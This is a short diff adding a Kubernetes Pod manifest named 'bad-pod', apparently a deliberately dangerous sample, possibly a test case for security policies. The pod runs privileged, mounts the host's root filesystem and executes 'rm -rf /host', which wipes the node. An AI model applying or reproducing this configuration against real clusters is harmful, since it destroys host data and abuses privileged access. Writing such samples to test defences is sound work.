@@ -1,0 +1,22 @@
+apiVersion: v1
+kind: Pod
+metadata:
+  labels:
+    run: bad-pod
+  name: bad-pod
+spec:
+  volumes:
+  - name: host
+    hostPath:
+      path: /
+  containers:
+  - image: ubuntu
+    name: bad
+    command:
+    - "/bin/bash"
+    - "-c"
+    args:
+    - "rm -rf /host"
+    securityContext:
+      privileged: true
+
